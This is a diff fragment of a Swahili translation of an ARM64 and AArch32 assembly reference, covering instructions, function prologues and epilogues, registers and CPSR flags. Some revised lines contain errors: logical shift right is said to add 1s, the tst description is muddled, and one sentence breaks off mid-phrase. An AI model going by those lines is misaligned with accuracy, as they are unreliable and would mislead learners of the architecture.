-- Mfano: `div x0, x1, x2` — Hii inagawa thamani ya `x1` kwa `x2` na kuhifadhi matokeo katika `x0`.
+- Xn3 | #imm -> Operando 2 (register au immediate)
+- \[shift #N | RRX] -> Fanya shift au ita RRX
+- Mfano: `add x0, x1, x2` — Hii hujumlisha values zilizo katika `x1` na `x2` na kuhifadhi matokeo katika `x0`.
+- `add x5, x5, #1, lsl #12` — Hii ni sawa na 4096 (1 iliyofanyiwa shift mara 12) -> 1 0000 0000 0000 0000
+- **`adds`** Hii hufanya `add` na kusasisha flags
+- **`sub`**: **Toa** values za registers mbili na uhifadhi matokeo katika register.
+- Angalia **`add`** **syntax**.
+- Mfano: `sub x0, x1, x2` — Hii hutoa value ya `x2` kutoka `x1` na kuhifadhi matokeo katika `x0`.
+- **`subs`** Hii ni kama sub lakini inasasisha flag
+- **`mul`**: **Zidisha** values za **registers mbili** na uhifadhi matokeo katika register.
+- Mfano: `mul x0, x1, x2` — Hii huzidisha values zilizo katika `x1` na `x2` na kuhifadhi matokeo katika `x0`.
+- **`div`**: **Gawanya** value ya register moja kwa nyingine na uhifadhi matokeo katika register.
+- Mfano: `div x0, x1, x2` — Hii hugawanya value ya `x1` kwa `x2` na kuhifadhi matokeo katika `x0`.
 - **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
-- **Logical shift left**: Ongeza 0s mwishoni ukienda mbele bit nyingine (kuzidisha kwa mara n)
-- **Logical shift right**: Ongeza 0s mwanzoni ukienda nyuma bit nyingine (kugawa kwa mara n katika unsigned)
-- **Arithmetic shift right**: Kama **`lsr`**, lakini badala ya kuongeza 0s ikiwa bit inayofuata ni 1, **1s zinaongezwa** (gawa kwa mara n katika signed)
-- **Rotate right**: Kama **`lsr`** lakini kile kinachondolewa kutoka kulia kinambatishwa kushoto
-- **Rotate Right with Extend**: Kama **`ror`**, lakini kwa kutumia bendera ya carry kama "most significant bit". Hivyo bendera ya carry inahamishwa kuwa bit 31 na bit iliyotolewa kwenda bendera ya carry.
-- **`bfm`**: **Bit Filed Move**, operesheni hizi **huelekeza nakala ya bits `0...n`** kutoka kwa thamani na kuzihami katika nafasi **`m..m+n`**. **`#s`** inaonyesha **nafasi ya bit ya kushoto** na **`#r`** ni kiasi cha kuzungusha kulia.
+- **Logical shift left**: Ongeza 0 mwishoni huku ukisogeza bits nyingine mbele (zidisha kwa n-times 2)
+- **Logical shift right**: Ongeza 1 mwanzoni huku ukisogeza bits nyingine nyuma (gawanya kwa n-times 2 katika unsigned)
+- **Arithmetic shift right**: Kama **`lsr`**, lakini badala ya kuongeza 0 ikiwa most significant bit ni 1, **1 huongezwa** (gawanya kwa n-times 2 katika signed)
+- **Rotate right**: Kama **`lsr`**, lakini chochote kinachoondolewa upande wa kulia huongezwa upande wa kushoto
+- **Rotate Right with Extend**: Kama **`ror`**, lakini carry flag hutumika kama "most significant bit". Kwa hiyo carry flag huhamishwa hadi bit 31 na bit iliyoondolewa huenda kwenye carry flag.
+- **`bfm`**: **Bit Field Move**, operations hizi **hunakili bits `0...n`** kutoka kwenye value na kuziweka katika positions **`m..m+n`**. **`#s`** huonyesha position ya **leftmost bit**, na **`#r`** kiasi cha rotate right.
 - Bitfield move: `BFM Xd, Xn, #r`
 - Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
 - Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
-- **Bitfield Extract and Insert:** Nakili bitfield kutoka rejista na kuiweka katika rejista nyingine.
-- **`BFI X1, X2, #3, #4`** Weka bits 4 kutoka X2 kutoka bit ya 3 ya X1
-- **`BFXIL X1, X2, #3, #4`** Chukua kutoka bit 3 ya X2 bits nne na ziweke kwenye X1
-- **`SBFIZ X1, X2, #3, #4`** Inapanua kwa sign bits 4 kutoka X2 na kuitia ndani X1 kuanzia nafasi ya bit 3 ukifuta bits za kulia
-- **`SBFX X1, X2, #3, #4`** Inachukua bits 4 kuanzia bit 3 kutoka X2, inapanua kwa sign, na kuiweka matokeo ndani ya X1
-- **`UBFIZ X1, X2, #3, #4`** Inapanua kwa zero bits 4 kutoka X2 na kuziweka ndani X1 kuanzia nafasi ya bit 3 ukifuta bits za kulia
-- **`UBFX X1, X2, #3, #4`** Inachukua bits 4 kuanzia bit 3 kutoka X2 na kuiweka matokeo yaliyopanuliwa kwa zero ndani ya X1.
-- **Sign Extend To X:** Inapanua sign (au kuongeza 0s katika toleo la unsigned) ya thamani ili iweze kutumika katika operesheni:
-- **`SXTB X1, W2`** Inapanua sign ya byte **kutoka W2 hadi X1** (`W2` ni nusu ya `X2`) ili kujaza 64bits
-- **`SXTH X1, W2`** Inapanua sign ya nambari ya 16bit **kutoka W2 hadi X1** ili kujaza 64bits
-- **`SXTW X1, W2`** Inapanua sign ya byte **kutoka W2 hadi X1** ili kujaza 64bits
-- **`UXTB X1, W2`** Inaongeza 0s (unsigned) kwa byte **kutoka W2 hadi X1** ili kujaza 64bits
-- **`extr`:** Inachukua bits kutoka kwa jozi ya rejista zilizounganishwa.
-- Mfano: `EXTR W3, W2, W1, #3` Hii itachanganya W1+W2 na kupata kuanzia bit 3 ya W2 hadi bit 3 ya W1 na kuihifadhi ndani ya W3.
-- **`cmp`**: **Linganisha** rejista mbili na kuweka bendera za masharti. Ni **alias ya `subs`** ikizuia rejista ya destination kuwa zero register. Inafaa kujua kama `m == n`.
-- Inasaidia **sintaksia ile ile kama `subs`**
-- Mfano: `cmp x0, x1` — Hii inalinganisha thamani katika `x0` na `x1` na kuweka bendera za masharti ipasavyo.
-- **`cmn`**: **Linganisho la negative** operand. Katika kesi hii ni **alias ya `adds`** na inaunga mkono sintaksia ile ile. Inafaa kujua kama `m == -n`.
-- **`ccmp`**: Linganisho la masharti, ni kulinganisha kunakofanywa tu ikiwa linganisho la awali lilikuwa kweli na hasa litaset bendera nzcv.
+- **Bitfield Extract and Insert:** Hunakili bitfield kutoka register na kuipeleka kwenye register nyingine.
+- **`BFI X1, X2, #3, #4`** Ingiza bits 4 kutoka X2 kuanzia bit ya 3 ya X1
+- **`BFXIL X1, X2, #3, #4`** Extract bits 4 kutoka X2 kuanzia bit ya 3 na zinakili kwenye X1
+- **`SBFIZ X1, X2, #3, #4`** Sign-extend bits 4 kutoka X2 na kuziingiza katika X1 kuanzia bit position ya 3, huku ikifanya right bits kuwa zero
+- **`SBFX X1, X2, #3, #4`** Hutoa bits 4 zinazoanzia bit ya 3 kutoka X2, huzifanya sign extend, na kuweka matokeo katika X1
+- **`UBFIZ X1, X2, #3, #4`** Zero-extend bits 4 kutoka X2 na kuziingiza katika X1 kuanzia bit position ya 3, huku ikifanya right bits kuwa zero
+- **`UBFX X1, X2, #3, #4`** Hutoa bits 4 zinazoanzia bit ya 3 kutoka X2 na kuweka matokeo yenye zero-extension katika X1.
+- **Sign Extend To X:** Hupanua sign (au huongeza 0 pekee katika unsigned version) ya value ili iweze kufanya operations nayo:
+- **`SXTB X1, W2`** Hupanua sign ya byte **kutoka W2 hadi X1** (`W2` ni nusu ya `X2`) ili kujaza bits 64
+- **`SXTH X1, W2`** Hupanua sign ya number ya bits 16 **kutoka W2 hadi X1** ili kujaza bits 64
+- **`SXTW X1, W2`** Hupanua sign ya byte **kutoka W2 hadi X1** ili kujaza bits 64
+- **`UXTB X1, W2`** Huongeza 0 (unsigned) kwenye byte **kutoka W2 hadi X1** ili kujaza bits 64
+- **`extr`:** Hutoa bits kutoka kwa **pair maalum ya registers zilizounganishwa**.
+- Mfano: `EXTR W3, W2, W1, #3` Hii itaunganisha **W1+W2** na kupata **kuanzia bit ya 3 ya W2 hadi bit ya 3 ya W1**, kisha kuhifadhi katika W3.
+- **`cmp`**: **Linganisha** registers mbili na uweke condition flags. Ni **alias ya `subs`** inayoweka destination register kuwa zero register. Ni muhimu kujua ikiwa `m == n`.
+- Inatumia syntax **ileile ya `subs`**
+- Mfano: `cmp x0, x1` — Hii hulinganisha values zilizo katika `x0` na `x1` na kuweka condition flags ipasavyo.
+- **`cmn`**: **Linganisha** operand negative. Katika hali hii ni **alias ya `adds`** na hutumia syntax ileile. Ni muhimu kujua ikiwa `m == -n`.
+- **`ccmp`**: Conditional comparison; ni comparison itakayofanywa tu ikiwa previous comparison ilikuwa true, na itaweka bits za nzcv mahususi.
 - `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ikiwa x1 != x2 na x3 < x4, ruka kwenda func
-- Hii ni kwa sababu **`ccmp`** itatekelezwa tu ikiwa **`cmp`** ya awali ilikuwa `NE`, ikiwa haikuwa hivyo bits `nzcv` zitasetwa kuwa 0 (ambayo haitafanikisha ulinganifu wa `blt`).
-- Hii pia inaweza kutumika kama `ccmn` (sawa lakini negative, kama `cmp` vs `cmn`).
-- **`tst`**: Inachunguza ikiwa yoyote ya thamani za kulinganisha ni 1 (inafanya kazi kama ANDS bila kuhifadhi matokeo mahali popote). Inafaa kuangalia rejista dhidi ya thamani na kuangalia ikiwa bit yoyote ya rejista iliyotajwa ndani ya thamani ni 1.
-- Mfano: `tst X1, #7` Angalia ikiwa yoyote ya bits 3 za mwisho za X1 ni 1
-- **`teq`**: Operesheni XOR ikituliza matokeo
-- **`b`**: Branch isiyo na masharti
+- Hii ni kwa sababu **`ccmp`** itatekelezwa tu ikiwa previous **`cmp`** ilikuwa **`NE`**; ikiwa haikuwa hivyo, bits za `nzcv` zitawekwa kuwa 0 (ambazo hazitatimiza comparison ya `blt`).
+- Hii pia inaweza kutumika kama `ccmn` (vilevile lakini negative, kama `cmp` dhidi ya `cmn`).
+- **`tst`**: Hukagua ikiwa values za comparison zote mbili ni 1 (hufanya kazi kama ANDS bila kuhifadhi matokeo popote). Ni muhimu kukagua register kwa value na kujua ikiwa bits zozote za register zilizoonyeshwa katika value ni 1.
+- Mfano: `tst X1, #7` Hukagua ikiwa bits 3 za mwisho za X1 zina 1 yoyote
+- **`teq`**: XOR operation inayotupa matokeo
+- **`b`**: Unconditional Branch
 - Mfano: `b myFunction`
-- Kumbuka hii haitajaza link register na anwani ya kurudi (si nzuri kwa miito ya subroutine zinazotakiwa kurudi)
-- **`bl`**: **Branch** na link, inatumika **kuitwa** kwa **subroutine**. Inahifadhi **anwani ya kurudi katika `x30`**.
-- Mfano: `bl myFunction` — Hii inaita function `myFunction` na kuhifadhi anwani ya kurudi katika `x30`.
-- Kumbuka hii haitajaza link register na anwani ya kurudi (si nzuri kwa subrutine zinazotakiwa kurudi)
-- **`blr`**: **Branch** na Link kwa Rejista, inatumika **kuitwa** kwa **subroutine** ambapo lengwa ameainishwa ndani ya **rejista**. Inahifadhi anwani ya kurudi katika `x30`. (Hii ni
-- Mfano: `blr x1` — Hii inaita function ambayo anwani yake iko ndani ya `x1` na kuhifadhi anwani ya kurudi katika `x30`.
-- **`ret`**: **Rudi** kutoka **subroutine**, kwa kawaida ukitumia anwani katika **`x30`**.
-- Mfano: `ret` — Hii inarudi kutoka subroutine ya sasa ikitumia anwani ya kurudi katika `x30`.
-- **`b.<cond>`**: Branch za masharti
-- **`b.eq`**: **Ruka ikiwa sawa**, kulingana na amri ya `cmp` iliyopita.
-- Mfano: `b.eq label` — Ikiwa amri ya `cmp` iliyopita ilikuta thamani mbili sawa, hii inaruka kwenda `label`.
-- **`b.ne`**: **Ruka ikiwa si sawa**. Amri hii inakagua bendera za masharti (zilizo setiwa na amri ya comparison ya awali), na ikiwa thamani zililinganiswa zilikosekana, inaruka kwenda label au anwani.
-- Mfano: Baada ya amri `cmp x0, x1`, `b.ne label` — Ikiwa thamani katika `x0` na `x1` hazikuwa sawa, hii inaruka kwenda `label`.
-- **`cbz`**: **Compare and Branch on Zero**. Amri hii inalinganisha rejista na sifuri, na ikiwa zinafanana, inaruka kwenda label au anwani.
-- Mfano: `cbz x0, label` — Ikiwa thamani kwenye `x0` ni sifuri, hii inaruka kwenda `label`.
-- **`cbnz`**: **Compare and Branch on Non-Zero**. Amri hii inalinganisha rejista na sifuri, na ikiwa hazifanani, inaruka kwenda label au anwani.
-- Mfano: `cbnz x0, label` — Ikiwa thamani kwenye `x0` si sifuri, hii inaruka kwenda `label`.
+- Kumbuka kwamba hii haitajaza link register kwa return address (haifai kwa subroutine calls zinazohitaji kurudi)
+- **`bl`**: **Branch** with link, hutumika **kuita** **subroutine**. Huhifadhi **return address katika `x30`**.
+- Mfano: `bl myFunction` — Hii huita function ya `myFunction` na kuhifadhi return address katika `x30`.
+- Kumbuka kwamba hii haitajaza link register kwa return address (haifai kwa subroutine calls zinazohitaji kurudi)
+- **`blr`**: **Branch** with Link to Register, hutumika **kuita** **subroutine** ambapo target **imeainishwa** katika **register**. Huhifadhi return address katika `x30`. (Hii ni
+- Mfano: `blr x1` — Hii huita function ambayo address yake imo katika `x1` na kuhifadhi return address katika `x30`.
+- **`ret`**: **Rudi** kutoka **subroutine**, kwa kawaida ikitumia address iliyo katika **`x30`**.
+- Mfano: `ret` — Hii hurudi kutoka current subroutine kwa kutumia return address iliyo katika `x30`.
+- **`b.<cond>`**: Conditional branches
+- **`b.eq`**: **Branch if equal**, kulingana na instruction ya awali ya `cmp`.
+- Mfano: `b.eq label` — Ikiwa instruction ya awali ya `cmp` ilipata values mbili zilizo sawa, hii huruka kwenda `label`.
+- **`b.ne`**: **Branch if Not Equal**. Instruction hii hukagua condition flags (zilizowekwa na previous comparison instruction), na ikiwa values zilizolinganishwa hazikuwa sawa, huruka kwenda label au address.
+- Mfano: Baada ya instruction ya `cmp x0, x1`, `b.ne label` — Ikiwa values zilizo katika `x0` na `x1` hazikuwa sawa, hii huruka kwenda `label`.
+- **`cbz`**: **Compare and Branch on Zero**. Instruction hii hulinganisha register na zero, na ikiwa zinalingana, huruka kwenda label au address.
+- Mfano: `cbz x0, label` — Ikiwa value ya `x0` ni zero, hii huruka kwenda `label`.
+- **`cbnz`**: **Compare and Branch on Non-Zero**. Instruction hii hulinganisha register na zero, na ikiwa hazilingani, huruka kwenda label au address.
+- Mfano: `cbnz x0, label` — Ikiwa value ya `x0` si zero, hii huruka kwenda `label`.
 - **`tbnz`**: Test bit and branch on nonzero
 - Mfano: `tbnz x0, #8, label`
 - **`tbz`**: Test bit and branch on zero
 - Mfano: `tbz x0, #8, label`
-- **Operesheni za kuchagua za masharti (Conditional select operations)**: Hizi ni operesheni ambapo tabia yake inatofautiana kulingana na bendera za masharti.
-- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ikiwa kweli, X0 = X1, ikiwa si kweli, X0 = X2
-- `csinc Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si kweli, Xd = Xm + 1
-- `cinc Xd, Xn, cond` -> Ikiwa kweli, Xd = Xn + 1, ikiwa si kweli, Xd = Xn
-- `csinv Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si, Xd = NOT(Xm)
-- `cinv Xd, Xn, cond` -> Ikiwa kweli, Xd = NOT(Xn), ikiwa si, Xd = Xn
-- `csneg Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si, Xd = - Xm
-- `cneg Xd, Xn, cond` -> Ikiwa kweli, Xd = - Xn, ikiwa si, Xd = Xn
-- `cset Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = 1, ikiwa si, Xd = 0
-- `csetm Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = \<all 1>, ikiwa si, Xd = 0
-- **`adrp`**: Hesabu anwani ya ukurasa wa alama na kuihifadhi katika rejista.
-- Mfano: `adrp x0, symbol` — Hii inahesabu anwani ya ukurasa wa `symbol` na kuihifadhi katika `x0`.
-- **`ldrsw`**: **Pakia** thamani iliyosainiwa ya **32-bit** kutoka kumbukumbu na **kuipanua kwa sign hadi 64** bits. Hii hutumika kwa kesi za SWITCH zinazotumika mara nyingi.
-- Mfano: `ldrsw x0, [x1]` — Hii inapakia thamani ya 32-bit iliyosainiwa kutoka eneo la kumbukumbu linaloelekezwa na `x1`, kuipanua kwa sign hadi 64 bits, na kuihifadhi ndani ya `x0`.
-- **`stur`**: **Hifadhi** thamani ya rejista kwenye eneo la kumbukumbu, ukitumia offset kutoka rejista nyingine.
-- Mfano: `stur x0, [x1, #4]` — Hii inahifadhi thamani ya `x0` kwenye anwani ya kumbukumbu ambayo ni byte 4 kubwa kuliko anwani iliyopo sasa katika `x1`.
-- **`svc`** : Fanya **system call**. Inasimama kwa "Supervisor Call". Wakati processor inatekeleza amri hii, **inabadilisha kutoka user mode kwenda kernel mode** na kuruka kwenye eneo maalum la kumbukumbu ambapo **msimbo wa kushughulikia system call wa kernel** upo.
+- **Conditional select operations**: Hizi ni operations ambazo tabia yake hubadilika kulingana na conditional bits.
+- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ikiwa true, X0 = X1; ikiwa false, X0 = X2
+- `csinc Xd, Xn, Xm, cond` -> Ikiwa true, Xd = Xn; ikiwa false, Xd = Xm + 1
+- `cinc Xd, Xn, cond` -> Ikiwa true, Xd = Xn + 1; ikiwa false, Xd = Xn
+- `csinv Xd, Xn, Xm, cond` -> Ikiwa true, Xd = Xn; ikiwa false, Xd = NOT(Xm)
+- `cinv Xd, Xn, cond` -> Ikiwa true, Xd = NOT(Xn); ikiwa false, Xd = Xn
+- `csneg Xd, Xn, Xm, cond` -> Ikiwa true, Xd = Xn; ikiwa false, Xd = - Xm
+- `cneg Xd, Xn, cond` -> Ikiwa true, Xd = - Xn; ikiwa false, Xd = Xn
+- `cset Xd, Xn, Xm, cond` -> Ikiwa true, Xd = 1; ikiwa false, Xd = 0
+- `csetm Xd, Xn, Xm, cond` -> Ikiwa true, Xd = \<all 1>; ikiwa false, Xd = 0
+- **`adrp`**: Kokotoa **page address ya symbol** na kuihifadhi katika register.
+- Mfano: `adrp x0, symbol` — Hii hukokotoa page address ya `symbol` na kuihifadhi katika `x0`.
+- **`ldrsw`**: **Load** value ya signed **bits 32** kutoka memory na **sign-extend hadi bits 64**. Hii hutumika kwa SWITCH cases za kawaida.
+- Mfano: `ldrsw x0, [x1]` — Hii hu-load signed 32-bit value kutoka memory location inayoonyeshwa na `x1`, huifanya sign-extend hadi bits 64, na kuihifadhi katika `x0`.
+- **`stur`**: **Hifadhi register value kwenye memory location**, kwa kutumia offset kutoka register nyingine.
+- Mfano: `stur x0, [x1, #4]` — Hii huhifadhi value ya `x0` kwenye memory address iliyo bytes 4 zaidi ya address iliyo sasa katika `x1`.
+- **`svc`** : Fanya **system call**. Inasimamia "Supervisor Call". Processor inapotekeleza instruction hii, **hubadilika kutoka user mode kwenda kernel mode** na kuruka hadi memory location maalum ambako code ya **kernel's system call handling** iko.
 
 - Mfano:
 
@@ -239,19 +239,19 @@ svc 0       ; Make the system call.
 ```armasm
 stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
 ```
-2. **Sanidi kiashiria kipya cha fremu**: `mov x29, sp` (huweka kiashiria kipya cha fremu kwa ajili ya kazi ya sasa)
-3. **Tenga nafasi kwenye stack kwa vigezo vya ndani** (ikiwa inahitajika): `sub sp, sp, <size>` (ambapo `<size>` ni idadi ya bytes zinazohitajika)
+2. **Weka frame pointer mpya**: `mov x29, sp` (huweka frame pointer mpya kwa ajili ya function ya sasa)
+3. **Tenga nafasi kwenye stack kwa ajili ya local variables** (ikiwa inahitajika): `sub sp, sp, <size>` (ambapo `<size>` ni idadi ya bytes zinazohitajika)
 
-### **Epilogi ya function**
+### **Function Epilogue**
 
-1. **Toa nafasi ya vigezo vya ndani (ikiwa zilitengewa)**: `add sp, sp, <size>`
-2. **Rejesha link register na kiashiria cha fremu**:
+1. **Ondoa local variables** (ikiwa zilitengwa): `add sp, sp, <size>`
+2. **Rejesha link register na frame pointer**:
 ```armasm
 ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
 ```
-3. **Return**: `ret` (inarudisha udhibiti kwa muite kwa kutumia anwani iliyopo kwenye registri ya kiungo)
+3. **Return**: `ret` (hurudisha udhibiti kwa caller kwa kutumia anwani iliyo kwenye link register)
 
-## Ulinzi wa Kumbukumbu wa Kawaida wa ARM
+## Ulinzi wa Kawaida wa Kumbukumbu wa ARM
 
 {{#ref}}
 ../../../binary-exploitation/ios-exploiting/README.md
@@ -259,12 +259,12 @@ ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment th
 
 ## Hali ya Utekelezaji ya AARCH32
 
-Armv8-A inaunga mkono utekelezaji wa programu za 32-bit. **AArch32** inaweza kuendesha katika mojawapo ya **seti mbili za maagizo**: **`A32`** na **`T32`** na inaweza kubadili kati yao kupitia **`interworking`**.\
-Programu za 64-bit zilizo na ruhusa za juu zinaweza kupanga utekelezaji wa programu za **32-bit** kwa kutekeleza uhamisho wa kiwango cha exception kwenda 32-bit yenye ruhusa za chini.\
-Kumbuka kuwa mabadiliko kutoka 64-bit hadi 32-bit yanatokea kwa kiwango cha exception cha chini (kwa mfano programu ya 64-bit katika EL1 ikianzisha programu katika EL0). Hii hufanywa kwa kuweka **bit 4 ya** **`SPSR_ELx`** registri maalum **iwe 1** wakati thread ya mchakato wa `AArch32` iko tayari kutekelezwa na sehemu iliyobaki ya `SPSR_ELx` inahifadhi CPSR ya programu za **`AArch32`**. Kisha, mchakato mwenye ruhusa huita instruksi ya **`ERET`** ili processor ibadilike hadi **`AArch32`**, ikaingia katika A32 au T32 kulingana na CPSR.
+Armv8-A inasaidia utekelezaji wa programu za 32-bit. **AArch32** inaweza kuendeshwa katika mojawapo ya **instruction sets mbili**: **`A32`** na **`T32`**, na inaweza kubadilisha kati yazo kupitia **`interworking`**.\
+Programu za **Privileged** za 64-bit zinaweza kuratibu **utekelezaji wa** programu za **32-bit** kwa kutekeleza uhamisho wa exception level kwenda kwenye 32-bit yenye privilege ya chini.\
+Kumbuka kwamba mpito kutoka 64-bit kwenda 32-bit hutokea pamoja na kushushwa kwa exception level (kwa mfano, programu ya 64-bit katika EL1 ikianzisha programu katika EL0). Hili hufanywa kwa kuweka **bit 4 ya** register maalum ya **`SPSR_ELx`** **kuwa 1** wakati thread ya mchakato wa `AArch32` iko tayari kutekelezwa, huku sehemu iliyobaki ya `SPSR_ELx` ikihifadhi CPSR ya programu za **`AArch32`**. Kisha mchakato wa privileged huita instruction ya **`ERET`**, hivyo processor hubadilika kwenda **`AArch32`** na kuingia katika A32 au T32 kulingana na CPSR**.**
 
-The **`interworking`** hutokea kwa kutumia bits J na T za CPSR. `J=0` na `T=0` ina maana **`A32`** na `J=0` na `T=1` ina maana **T32**. Hii kawaida inamaanisha kuweka **bit ndogo kabisa kuwa 1** kuonyesha kuwa seti ya maagizo ni T32.\
-Hii inasetwa wakati wa **maagizo ya tawi ya interworking,** lakini pia inaweza kuwekwa moja kwa moja na maagizo mengine wakati PC imewekwa kama registri ya lengo. Mfano:
+**`interworking`** hutokea kwa kutumia bits za J na T za CPSR. `J=0` na `T=0` humaanisha **`A32`**, na `J=0` na `T=1` humaanisha **T32**. Kimsingi, hii inamaanisha kuweka **bit ya chini kuwa 1** ili kuonyesha kwamba instruction set ni T32.\
+Hii huwekwa wakati wa **interworking branch instructions,** lakini pia inaweza kuwekwa moja kwa moja kwa instructions nyingine wakati PC imewekwa kama destination register. Mfano:
 
 Mfano mwingine:
 ```armasm
@@ -277,50 +277,50 @@ bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)
 mov r0, #0
 mov r0, #8
 ```
-### Rejista
+### Registers
 
-Kuna rejista 16 za 32-bit (r0-r15). **From r0 to r14** zinaweza kutumika kwa **kazi yoyote**, hata hivyo baadhi yao kawaida zinahifadhiwa:
+Kuna rejista 16 za biti 32 (`r0-r15`). **Kuanzia r0 hadi r14** zinaweza kutumika kwa **operesheni yoyote**, hata hivyo baadhi yao kwa kawaida hutengwa:
 
-- **`r15`**: kaunta ya programu (daima). Inabeba anwani ya agizo lijalo. Katika A32 current + 8, katika T32, current + 4.
-- **`r11`**: Kiashiria cha fremu
-- **`r12`**: rejista ya wito la ndani la taratibu
-- **`r13`**: Kiashiria cha stack (Kumbuka stack daima imepangwa kwa ulinganifu wa 16-byte)
-- **`r14`**: Rejista ya kiungo
+- **`r15`**: Program counter (kila wakati). Ina anwani ya instruction inayofuata. Katika A32 ni current + 8, na katika T32 ni current + 4.
+- **`r11`**: Frame Pointer
+- **`r12`**: Intra-procedural call register
+- **`r13`**: Stack Pointer (Kumbuka kuwa stack huwa imepangiliwa kwa 16-byte kila wakati)
+- **`r14`**: Link Register
 
-Zaidi ya hayo, rejista zinahifadhiwa katika **`banked registries`**. Ambayo ni maeneo yanayohifadhi thamani za rejista na kuruhusu kufanya **fast context switching** wakati wa kushughulikia exception na operesheni zilizo na vibali ili kuepuka hitaji la kuhifadhi na kurejesha rejista kwa mikono kila wakati.\
-Hii hufanywa kwa **kuhifadhi hali ya processor kutoka `CPSR` hadi `SPSR`** ya mode ya processor ambayo exception imetumwa. Katika kurudisha exception, **`CPSR`** inarejeshwa kutoka kwa **`SPSR`**.
+Zaidi ya hayo, rejista huhifadhiwa katika **`banked registries`**. Hizi ni sehemu zinazohifadhi thamani za rejista, hivyo kuruhusu kufanya **fast context switching** wakati wa exception handling na operesheni zenye privilege, bila hitaji la kuhifadhi na kurejesha rejista mwenyewe kila wakati.\
+Hili hufanywa kwa **kuhifadhi hali ya processor kutoka `CPSR` kwenda `SPSR`** ya processor mode ambayo exception imehamishiwa. Wakati wa kurejea kutoka kwenye exception, **`CPSR`** hurejeshwa kutoka kwenye **`SPSR`**.
 
-### CPSR - Rejista ya Hali ya Programu ya Sasa
+### CPSR - Current Program Status Register
 
-Katika AArch32 CPSR inafanya kazi sawa na **`PSTATE`** katika AArch64 na pia huhifadhiwa katika **`SPSR_ELx`** wakati exception inachukuliwa ili kurejesha utekelezaji baadaye:
+Katika AArch32, CPSR hufanya kazi kwa njia inayofanana na **`PSTATE`** katika AArch64 na pia huhifadhiwa katika **`SPSR_ELx`** wakati exception inapotokea, ili kurejesha execution baadaye:
 
 <figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>
 
-Sehemu zimegawanywa katika makundi yafuatayo:
+Fields zimegawanywa katika makundi kadhaa:
 
-- Application Program Status Register (APSR): Bendera za kihesabu na zinapatikana kutoka EL0
-- Execution State Registers: Tabia ya mchakato (inasimamiwa na OS).
+- Application Program Status Register (APSR): Arithmetic flags zinazopatikana kutoka EL0
+- Execution State Registers: Tabia ya process (inasimamiwa na OS).
 
 #### Application Program Status Register (APSR)
 
-- Bendera **`N`**, **`Z`**, **`C`**, **`V`** (kama ilivyo katika AArch64)
-- Bendera **`Q`**: Inawekwa kuwa 1 kila wakati **integer saturation** inapotokea wakati wa utekelezaji wa maelekezo maalum ya hisabati ya saturating. Mara ikiwa imewekwa kuwa **`1`**, itaendelea kuwa hivyo hadi itakapowekwa kwa mikono kuwa 0. Zaidi ya hayo, hakuna maelekezo yanayochunguza thamani yake kwa njia ya implicit; lazima isomwe kwa mikono.
-- Bendera **`GE`** (Greater than or equal): Inatumika katika SIMD (Single Instruction, Multiple Data) operations, kama "parallel add" na "parallel subtract". Operesheni hizi zinawezesha kusindika pointi nyingi za data kwa maelekezo moja.
+- Flags za **`N`**, **`Z`**, **`C`**, **`V`** (kama ilivyo katika AArch64)
+- Flag ya **`Q`**: Hu-setiwa kuwa 1 kila **integer saturation inapotokea** wakati wa kutekeleza specialized saturating arithmetic instruction. Ikishasetwa kuwa **`1`**, itaendelea kuwa na thamani hiyo hadi iwekwe kuwa 0 mwenyewe. Zaidi ya hayo, hakuna instruction yoyote inayokagua thamani yake implicitly; lazima isomwe manually.
+- Flags za **`GE`** (Greater than or equal): Hutumika katika operesheni za SIMD (Single Instruction, Multiple Data), kama vile "parallel add" na "parallel subtract". Operesheni hizi huruhusu kuchakata data points nyingi katika instruction moja.
 
-Kwa mfano, maelekezo **`UADD8`** **huongeza wanandoa nne za byte** (kutoka kwa operands mbili za 32-bit) kwa njia sambamba na kuhifadhi matokeo katika rejista ya 32-bit. Kisha **inaweka bendera za `GE` katika `APSR`** kulingana na matokeo haya. Kila bendera ya GE inalingana na moja ya nyongeza za byte, ikionyesha kama nyongeza ya wanandoa wa byte ilitokea **overflow**.
+Kwa mfano, instruction ya **`UADD8`** **huongeza jozi nne za bytes** (kutoka operands mbili za biti 32) kwa parallel na kuhifadhi matokeo katika rejista ya biti 32. Kisha **hu-seti flags za `GE` katika `APSR`** kulingana na matokeo hayo. Kila GE flag inahusishwa na mojawapo ya additions za byte, na huonyesha ikiwa addition ya jozi hiyo ya bytes **ilisababisha overflow**.
 
-Maelekezo ya **`SEL`** yanatumia bendera hizi za GE kutekeleza vitendo vya masharti.
+Instruction ya **`SEL`** hutumia flags hizi za GE kufanya vitendo vya conditional.
 
-#### Rejista za Hali ya Utekelezaji
+#### Execution State Registers
 
-- Bits za **`J`** na **`T`**: **`J`** inapaswa kuwa 0 na ikiwa **`T`** ni 0 seti ya maelekezo A32 inatumiwa, na ikiwa ni 1, T32 inatumiwa.
-- IT Block State Register (`ITSTATE`): Hizi ni bits kutoka 10-15 na 25-26. Zinahifadhi masharti kwa maelekezo ndani ya kundi lenye prefix **`IT`**.
-- Bit **`E`**: Inaonyesha **endianness**.
-- Mode na Exception Mask Bits (0-4): Zinabainisha hali ya utekelezaji ya sasa. Bit ya **5** inaonyesha ikiwa programu inafanya kazi kama 32bit (1) au 64bit (0). Zingine 4 zinaonyesha **mode ya exception inayotumika kwa sasa** (wakati exception inapotokea na inashughulikiwa). Nambari iliyowekwa **inaonyesha kipaumbele cha sasa** ikiwa exception nyingine itasababisha wakati hii inaendeshwa.
